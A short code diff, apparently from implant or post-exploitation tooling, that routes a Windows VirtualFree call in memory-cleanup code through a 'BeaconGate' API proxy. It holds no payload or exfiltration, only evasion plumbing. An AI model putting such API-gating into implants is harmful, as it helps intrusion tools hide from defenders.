@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <stdlib.h>
 #include "track_memory.h"
 
@@ -86,7 +87,7 @@ void track_memory_cleanup() {
 		else if (memoryTracker[i].type == TRACK_MEMORY_VALLOC) {
 			// dlog("track_memory_cleanup -- call memset & VirtualFree function: %p", memoryTracker[i].ptr);
 			memset(memoryTracker[i].ptr, 0, memoryTracker[i].size);
-			VirtualFree(memoryTracker[i].ptr, 0, MEM_RELEASE);
+			gate_VirtualFree(memoryTracker[i].ptr, 0, MEM_RELEASE);
 		}
 		else if (memoryTracker[i].type == TRACK_MEMORY_STATIC) {
 			/* static storage: zero at exit but never free() - the pointer
